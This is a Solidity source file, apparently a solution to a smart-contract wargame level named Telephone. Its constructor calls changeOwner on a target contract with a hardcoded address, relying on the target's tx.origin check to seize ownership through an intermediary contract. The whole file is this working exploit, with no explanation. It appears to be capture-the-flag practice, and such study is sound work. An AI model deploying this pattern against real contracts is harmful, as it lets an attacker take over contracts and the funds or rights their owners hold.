// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./Telephone.sol";
contract HackTelephone {
    address target;
     constructor(address _target){
       target = _target;
       Telephone(target).changeOwner(0x052f899e4e3fe467FDF76155548ac9ef8A1d5caf);
     }
}